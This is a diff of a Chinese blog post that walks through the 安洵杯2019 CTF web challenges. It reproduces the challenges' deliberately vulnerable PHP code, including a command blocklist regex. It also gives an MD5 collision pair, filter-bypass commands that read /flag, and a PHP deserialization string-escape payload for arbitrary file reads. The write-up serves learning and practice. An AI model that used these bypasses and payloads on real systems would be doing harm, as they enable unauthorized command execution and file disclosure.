@@ -466,69 +466,321 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
 <h1 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h1><p>进去后url有两个明显参数，第一个类似于base64编码，第二个由参数名知道可能是rce参数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;</span><br></pre></td></tr></table></figure>
+<pre><code>?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code></pre><p>先解码前面一个参数的值，发现base64解了两次后得到一串数字，看起来像十六进制字符。尝试16进制解码后得到<code>555.pnf0</code>证实了加密方式。<br>加上图片的回显有base64的内容，可知img参数用于文件包含，那么包含下index.php吧</p>
+<pre><code class="python">import base64
+import binascii
 
-<p>先解码前面一个参数的值，发现base64解了两次后得到一串数字，看起来像十六进制字符。尝试16进制解码后得到<code>555.pnf0</code>证实了加密方式。<br>加上图片的回显有base64的内容，可知img参数用于文件包含，那么包含下index.php吧</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str=<span class="string">'index.php'</span></span><br><span class="line">filename = str.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">hex = binascii.b2a_hex(filename)</span><br><span class="line">print(hex)</span><br><span class="line">base1 = base64.b64encode(hex)</span><br><span class="line">base2 = base64.b64encode(base1)</span><br><span class="line">print(base2.decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>
 
+str=&#39;index.php&#39;
+filename = str.encode(encoding=&#39;utf-8&#39;)
+hex = binascii.b2a_hex(filename)
+print(hex)
+base1 = base64.b64encode(hex)
+base2 = base64.b64encode(base1)
+print(base2.decode(&#39;utf-8&#39;))</code></pre>
 <p>得到源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>第一个参数已经利用完了，而第二个参数用于rce,但明显过滤了许多读取文件的命令。<br>同时可知要执行命令必须绕过一层MD5对比。基于使用了php强相等符号，可知一定要找到一对MD5相同的不同字符串。可以用某种MD5碰撞生成器得到。我直接用官方wp里的吧</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
-<p>之后就是执行命令了。直接利用匹配正则里面<code>\</code>的疏忽，用它使我们的关键字构建出来</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\t%20&#x2F;flag                    cat &#x2F;flag</span><br></pre></td></tr></table></figure>
-<p>或者使用没被过滤的读取文件的命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort &#x2F;flag</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+error_reporting(E_ALL || ~ E_NOTICE);
+header(&#39;content-type:text/html;charset=utf-8&#39;);
+$cmd = $_GET[&#39;cmd&#39;];
+if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) 
+    header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;);
+$file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));
 
-<p><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>
+$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);
+if (preg_match(&quot;/flag/i&quot;, $file)) {
+    echo &#39;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#39;;
+    die(&quot;xixi～ no flag&quot;);
+} else {
+    $txt = base64_encode(file_get_contents($file));
+    echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;/img&gt;&quot;;
+    echo &quot;&lt;br&gt;&quot;;
+}
+echo $cmd;
+echo &quot;&lt;br&gt;&quot;;
+if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) {
+    echo(&quot;forbid ~&quot;);
+    echo &quot;&lt;br&gt;&quot;;
+} else {
+    if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) {
+        echo `$cmd`;
+    } else {
+        echo (&quot;md5 is funny ~&quot;);
+    }
+}
+
+?&gt;
+&lt;html&gt;
+&lt;style&gt;
+  body{
+   background:url(./bj.png)  no-repeat center center;
+   background-size:cover;
+   background-attachment:fixed;
+   background-color:#CCCCCC;
+}
+&lt;/style&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<p>第一个参数已经利用完了，而第二个参数用于rce,但明显过滤了许多读取文件的命令。<br>同时可知要执行命令必须绕过一层MD5对比。基于使用了php强相等符号，可知一定要找到一对MD5相同的不同字符串。可以用某种MD5碰撞生成器得到。我直接用官方wp里的吧</p>
+<pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
+&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p>之后就是执行命令了。直接利用匹配正则里面<code>\</code>的疏忽，用它使我们的关键字构建出来</p>
+<pre><code>ca\t%20/flag                    cat /flag</code></pre><p>或者使用没被过滤的读取文件的命令</p>
+<pre><code>sort /flag</code></pre><p><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>
 <h1 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h1><p>题目对我有点难，但是打开了反序列化新世界的大门<br>一道反序列化利用题，上来直接给了源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+
+$function = @$_GET[&#39;f&#39;];
+
+function filter($img){
+    $filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);
+    $filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;
+    return preg_replace($filter,&#39;&#39;,$img);
+}
+
+
+if($_SESSION){
+    unset($_SESSION);
+}
+
+$_SESSION[&quot;user&quot;] = &#39;guest&#39;;
+$_SESSION[&#39;function&#39;] = $function;
+
+extract($_POST);
+
+if(!$function){
+    echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;
+}
+
+if(!$_GET[&#39;img_path&#39;]){
+    $_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);
+}else{
+    $_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));
+}
+
+$serialize_info = filter(serialize($_SESSION));
+
+if($function == &#39;highlight_file&#39;){
+    highlight_file(&#39;index.php&#39;);
+}else if($function == &#39;phpinfo&#39;){
+    eval(&#39;phpinfo();&#39;); //maybe you can find something in here!
+}else if($function == &#39;show_image&#39;){
+    $userinfo = unserialize($serialize_info);
+    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));
+}</code></pre>
 <p>思路上首先看看可控的参数，有get传值的<code>f,img_path</code>。但是注意到<code>img_path</code>搭配上<code>f</code>为<code>show_image</code>时，返回的内容并不可用，因为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));</span><br></pre></td></tr></table></figure>
-<p>中，我们传的值经过sha1加密后并没有解密，故不可用。<br>此时关注其他重点,有一句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract($_POST);</span><br></pre></td></tr></table></figure>
-<p>是一个变量覆盖的利用。所以我们的变量值都可以通过post操作改变，这样可控的参数多了起来。<br>同时注意到序列化语句，会在调用<code>show_image</code>时被触发</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$serialize_info &#x3D; filter(serialize($_SESSION));</span><br></pre></td></tr></table></figure>
-<p>漏洞点正在于此，在序列化数据之后，它经过了一层过滤才给变量赋值。而从最上方的过滤函数可知，出现被过滤的关键字直接替换为空。那么这是否会有漏洞可以用呢？答案是肯定的。出题人如是说：</p>
+<pre><code>$_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));</code></pre><p>中，我们传的值经过sha1加密后并没有解密，故不可用。<br>此时关注其他重点,有一句</p>
+<pre><code>extract($_POST);</code></pre><p>是一个变量覆盖的利用。所以我们的变量值都可以通过post操作改变，这样可控的参数多了起来。<br>同时注意到序列化语句，会在调用<code>show_image</code>时被触发</p>
+<pre><code>$serialize_info = filter(serialize($_SESSION));</code></pre><p>漏洞点正在于此，在序列化数据之后，它经过了一层过滤才给变量赋值。而从最上方的过滤函数可知，出现被过滤的关键字直接替换为空。那么这是否会有漏洞可以用呢？答案是肯定的。出题人如是说：</p>
 <blockquote>
 <p>任何具有一定结构的数据，如果经过了某些处理而把结构体本身的结构给打乱了，则有可能会产生漏洞。</p>
 </blockquote>
 <p>其意义在于，给<code>user</code>所赋的值刚好24个，而这24个字符由于过滤<code>flag</code>的原因，在经过序列化后被置为空。这时就可以吞掉一个function，做到任意读取文件。</p>
 <p>首先从提示phpinfo处找到一个不可直接读的php文件，我们先尝试利用漏洞读取它看看。（由于关键字里过滤了f1ag，所以在phpinfo界面搜f1ag关键字，果断发现d0g3_f1ag.php）<br>下面我来构造下序列化的类，从源码知道SESSION类有三个属性：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SESSION</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $user=<span class="string">"flagflagflagflagflagflag"</span>;</span><br><span class="line">    <span class="keyword">var</span> $function=<span class="string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"test";s:1:"a";&#125;'</span>;<span class="comment"># 其中为d0g3_f1ag.php base64编码</span></span><br><span class="line">    <span class="keyword">var</span> $img=<span class="string">"MS5qcGc="</span>;<span class="comment"># 值为1.jpg的base64编码</span></span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> SESSION();</span><br><span class="line"><span class="keyword">echo</span>(serialize($a));</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+class SESSION
+{
+    var $user=&quot;flagflagflagflagflagflag&quot;;
+    var $function=&#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:4:&quot;test&quot;;s:1:&quot;a&quot;;}&#39;;# 其中为d0g3_f1ag.php base64编码
+    var $img=&quot;MS5qcGc=&quot;;# 值为1.jpg的base64编码
+}
+$a=new SESSION();
+echo(serialize($a));</code></pre>
 <p>生成的payload如下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">"SESSION"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"user"</span>;s:<span class="number">24</span>:<span class="string">"flagflagflagflagflagflag"</span>;s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">61</span>:<span class="string">"a"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span>;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">1</span>:<span class="string">"a"</span>;&#125;<span class="string">";s:3:"</span>img<span class="string">";s:8:"</span>MS5qcGc=<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">O:7:&quot;SESSION&quot;:3:{s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:61:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:4:&quot;test&quot;;s:1:&quot;a&quot;;}&quot;;s:3:&quot;img&quot;;s:8:&quot;MS5qcGc=&quot;;}</code></pre>
 <p>而经过过滤后</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">"SESSION"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"user"</span>;s:<span class="number">24</span>:<span class="string">""</span>;s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">61</span>:<span class="string">"a"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span>;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">1</span>:<span class="string">"a"</span>;&#125;<span class="string">";s:3:"</span>img<span class="string">";s:8:"</span>MS5qcGc=<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">O:7:&quot;SESSION&quot;:3:{s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:61:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:4:&quot;test&quot;;s:1:&quot;a&quot;;}&quot;;s:3:&quot;img&quot;;s:8:&quot;MS5qcGc=&quot;;}</code></pre>
 <p>此时user属性对应的值被置空，那么它就要去把后面的24个字符置为它的值。也就是</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";s:8:"</span><span class="function"><span class="keyword">function</span>"</span>;s:<span class="number">59</span>:<span class="string">"a"</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;</code></pre>
 <p><strong>相当于吞掉了function属性</strong>，但是我们构造的<code>$function</code>中，包含了<code>img</code>属性的值，以及构造的一个<code>test</code>属性的值，使得我们的序列化数据仍然是满足一个类对应三个键值。这时它对序列化数据的匹配就是由<code>{</code>开始，到<code>}</code>结束。所以后面多余的字符<code>&quot;;s:3:&quot;img&quot;;s:8:&quot;MS5qcGc=&quot;;}</code>全部被忽略。<br>这样，我们通过控制function属性的值，达到了控制<code>img</code>属性值的效果，从而触发反序列化，读取文件。<br>最终payload如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:4:&quot;test&quot;;s:1:&quot;a&quot;;&#125;&amp;function&#x3D;show_image</span><br></pre></td></tr></table></figure>
-<p>(function也可以直接get传)<br><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>另外题目构造的其实是SESSION数组进行序列化，但是序列化格式一样，都可行。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b=<span class="keyword">array</span>(<span class="string">"user"</span>=&gt;<span class="string">"flagflagflagflagflagflag"</span>,</span><br><span class="line">    <span class="string">"function"</span>=&gt;<span class="string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"test";s:1:"a";&#125;'</span>,</span><br><span class="line">    <span class="string">"img"</span>=&gt;<span class="string">"MS5qcGc="</span>);</span><br><span class="line"><span class="keyword">echo</span>(serialize($b));</span><br></pre></td></tr></table></figure>
-
+<pre><code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:4:&quot;test&quot;;s:1:&quot;a&quot;;}&amp;function=show_image</code></pre><p>(function也可以直接get传)<br><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>另外题目构造的其实是SESSION数组进行序列化，但是序列化格式一样，都可行。</p>
+<pre><code class="php">&lt;?php
+$b=array(&quot;user&quot;=&gt;&quot;flagflagflagflagflagflag&quot;,
+    &quot;function&quot;=&gt;&#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:4:&quot;test&quot;;s:1:&quot;a&quot;;}&#39;,
+    &quot;img&quot;=&gt;&quot;MS5qcGc=&quot;);
+echo(serialize($b));</code></pre>
 <h1 id="不是文件上传"><a href="#不是文件上传" class="headerlink" title="不是文件上传"></a>不是文件上传</h1><p>也是一道反序列化题目，意图在于反序列化结合sql注入。在源码审计上下了不少功夫。如果我在比赛中做多半会卡在sql注入上吧。</p>
 <p>首先进入页面，可以发现网站底部留下了wowouploadimage，可以拿到一份源码。主要内容如下：<br>upload.php</p>
